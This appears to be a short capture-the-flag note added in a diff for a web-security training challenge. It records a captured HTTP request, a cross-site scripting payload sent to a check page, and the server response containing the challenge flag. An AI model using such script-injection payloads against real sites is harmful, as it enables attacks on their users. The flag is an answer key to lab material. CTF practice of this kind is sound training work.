@@ -1,0 +1,25 @@
+
+
+
+REQWUEST HEADER =
+POST http://vic.hackersacademy.com/web05/check.php HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: http://vic.hackersacademy.com/web05/index.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 25
+Cookie: PHPSESSID=0hb23hqs1kphht9jub0cni8ln8
+Connection: keep-alive
+Host: vic.hackersacademy.com
+
+
+SENT TO CHECK.PHP
+======================================================================================
+
+request =
+Title=hello&Content=<script>alert('Hello')</script>
+
+response =
+<div class='alert alert-success'><h2>flag{H4rd_C0d3d_V4l1dati0n_H4H_N0p3}</h2></div>
